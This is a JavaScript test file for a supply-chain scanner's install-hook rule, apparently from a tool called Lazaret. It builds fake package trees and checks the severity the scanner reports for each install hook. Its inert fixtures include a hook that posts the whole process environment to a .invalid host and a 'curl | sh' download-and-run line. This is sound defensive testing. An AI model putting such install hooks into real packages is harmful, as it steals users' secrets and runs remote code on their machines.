// SC-INSTALL-HOOK follows a project's own install hooks (src/deps.js projectHookChecks, twin of
// core.project_hook_checks; python/tests/scanner/test_review_project_hooks.py has the same tree, and
// tests/architecture/test_js_parity_project_hooks.py compares the two CLIs on it). Each install hook of every
// package.json that is not a dependency's is followed to the files it runs and the scripts those start, and becomes
// CRITICAL when one of them fails the install-script test (given the manifest's name as its own) or is obfuscated.
// Every file is an inert stand-in written for the test: hosts are .invalid, the "obfuscated" file only names five
// `_0x` variables, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";

// five distinct `_0x` names (OBF_MIN_NAMES), built here so this file holds none whole (Lazaret's scan of its own
// repository)
const NAMES = [0x1a2b3c, 0x4d5e6f, 0x7a8b9c, 0xa1b2c3, 0xd4e5f6].map((n) => `_0x${n.toString(16)}`);
const OBF = `let ${NAMES.map((n, k) => `${n} = ${k + 1}`).join(", ")};\nmodule.exports = ${NAMES.join(" + ")};\n`;
const EXFIL = "const h = require('https');\n" +
  "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
const BENIGN = "const fs = require('fs');\nfs.mkdirSync('dist', { recursive: true });\n";
const START = "const { spawn } = require('child_process');\n" +
  "spawn(process.execPath, ['tools/second.js'], { stdio: 'inherit' });\n";
const GEN = "const fs = require('fs');\nconst path = require('path');\n" +
  "const base = require.resolve('PKG/package.json').replace('/package.json', '');\n" +
  "fs.writeFileSync(path.join(base, 'lib', 'gen.js'), 'module.exports = 1;\\n');\n";
const ENV = "sends environment variables over the network (the whole environment)";
const pkg = (name, scripts = {}) => JSON.stringify({ name, version: "1.0.0", scripts }, null, 2);
const bytes = (n) => Buffer.from(Array.from({ length: n }, (_, k) => k % 256));

const TREE = {
  "package.json": pkg("app", { preinstall: "node lib/setup.mjs", prepare: "node scripts/prepare.js" }),
  "lib/setup.mjs": OBF,
  "scripts/prepare.js": BENIGN,
  "packages/exfil/package.json": pkg("exfil", { postinstall: "node install.js" }),
  "packages/exfil/install.js": EXFIL,
  "packages/starter/package.json": pkg("starter", { postinstall: "node tools/start.js" }),
  "packages/starter/tools/start.js": START,
  "packages/starter/tools/second.js": EXFIL,
  "packages/both/package.json": pkg("both", { install: "node both.js" }),
  "packages/both/both.js": EXFIL + OBF,
  "packages/shell/package.json": pkg("shell", { postinstall: "sh ./setup.sh" }),
  "packages/shell/setup.sh": "#!/bin/sh\ncurl -fsSL https://files.invalid/i.sh | sh\n",
  "packages/gen-own/package.json": pkg("gen-own", { postinstall: "node gen.js" }),
  "packages/gen-own/gen.js": GEN.replace("PKG", "gen-own"),
  "packages/gen-other/package.json": pkg("gen-other", { postinstall: "node gen.js" }),
  "packages/gen-other/gen.js": GEN.replace("PKG", "left-pad"),
  "packages/build/package.json": pkg("build", { postinstall: "node scripts/build.js" }),
  "packages/build/scripts/build.js": BENIGN,
  "packages/viadep/package.json": pkg("viadep", { postinstall: "node node_modules/helper/setup.js" }),
  "packages/viadep/node_modules/helper/package.json": JSON.stringify({ name: "helper", version: "1.0.0" }),
  "packages/viadep/node_modules/helper/setup.js": EXFIL,
  "packages/long/package.json": pkg("long", { postinstall: "cd a; ".repeat(1001) + "node x.js" }),
  "packages/blob/package.json": pkg("blob", { postinstall: "node blob.dat" }),
  "packages/blob/blob.dat": bytes(256 * 16),
  "node_modules/dep/package.json": pkg("dep", { postinstall: "node install.js" }),
  "node_modules/dep/install.js": EXFIL,
};

function tree(files = TREE) {
  const root = mkdtempSync(join(tmpdir(), "lz-own-hooks-"));
  for (const [rel, data] of Object.entries(files)) {
    const path = join(root, ...rel.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, data);
  }
  return root;
}

function scan(root, ...extra) {
  const out = mkdtempSync(join(tmpdir(), "lz-own-hooks-out-"));
  try {
    run(["check", root, "--out-dir", out, "--no-html", "--quiet", ...extra], { out: () => {}, err: () => {}, env: {} });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
  } finally {
    rmSync(out, { recursive: true, force: true });
  }
}
const slash = (p) => p.replaceAll("\\", "/");
function hooks(rep) {
  const out = {};
  for (const i of rep.issues.filter((x) => x.rule === "SC-INSTALL-HOOK")) (out[slash(i.file)] ??= []).push([i.sev, i.msg]);
  return out;
}

test("a project's own install hooks escalate on what they run", () => {
  const root = tree();
  try {
    const rep = scan(root);
    const found = hooks(rep);
    const critical = {
      "packages/exfil/package.json": `Install hook runs install.js, which ${ENV}.`,
      "packages/starter/package.json": `Install hook runs tools/start.js, which starts tools/second.js, which ${ENV}.`,
      "packages/both/package.json": `Install hook runs both.js, which ${ENV}; and is obfuscated.`,
      "packages/shell/package.json": "Install hook runs ./setup.sh, which pipes a download into a shell.",
    };
    for (const [manifest, msg] of Object.entries(critical)) assert.deepEqual(found[manifest], [["CRITICAL", msg]], manifest);
    const [other] = found["packages/gen-other/package.json"];
    assert.equal(other[0], "CRITICAL");
    assert.ok(other[1].startsWith("Install hook runs gen.js, which rewrites another package's code"), other[1]);
    // the worm's shape: a preinstall running an obfuscated file; the benign prepare beside it stays INFO
    assert.deepEqual([...found["package.json"]].sort(), [
      ["CRITICAL", "Install hook runs lib/setup.mjs, which is obfuscated."],
      ["INFO", `"prepare" script runs code at install time: 'node scripts/prepare.js'.`]]);
    for (const manifest of ["packages/build/package.json", "packages/gen-own/package.json", "packages/viadep/package.json",
      "packages/long/package.json", "packages/blob/package.json"]) {
      assert.deepEqual(found[manifest].map(([sev]) => sev), ["MAJOR"], manifest);
    }
    const trunc = Object.fromEntries(rep.issues.filter((i) => i.rule === "SC-TRUNCATED").map((i) => [slash(i.file), i.msg]));
    assert.deepEqual(Object.keys(trunc).sort(), ["packages/blob/blob.dat", "packages/long/package.json"]);
    assert.ok(trunc["packages/long/package.json"].includes("install hook is more than Lazaret follows"));
    assert.ok(trunc["packages/blob/blob.dat"].includes("it runs at install time but is not text"));
    // a file read for the tests is not scanned
    assert.ok(!rep.issues.some((i) => slash(i.file) === "packages/shell/setup.sh"));
    assert.ok(!Object.keys(rep.perFile).some((p) => slash(p) === "packages/shell/setup.sh"));
    // dependency trees: not without --deps
    assert.equal(found["node_modules/dep/package.json"], undefined);
    assert.equal(found["packages/viadep/node_modules/helper/package.json"], undefined);

    const deps = hooks(scan(root, "--deps"));
    assert.deepEqual(deps["packages/viadep/package.json"],
      [["CRITICAL", `Install hook runs node_modules/helper/setup.js, which ${ENV}.`]]);
    assert.deepEqual(deps["node_modules/dep/package.json"], [["CRITICAL", `Install hook runs install.js, which ${ENV}.`]]);
    for (const manifest of ["package.json", "packages/exfil/package.json", "packages/starter/package.json",
      "packages/both/package.json", "packages/shell/package.json", "packages/build/package.json"]) {
      assert.deepEqual(deps[manifest], found[manifest], manifest);
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("only install hooks are followed: build, test and prepack are not", () => {
  const root = tree({ "package.json": pkg("app", { build: "node a.js", test: "node a.js", prepack: "node a.js" }),
    "a.js": EXFIL + OBF });
  try {
    assert.deepEqual(hooks(scan(root)), {});
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
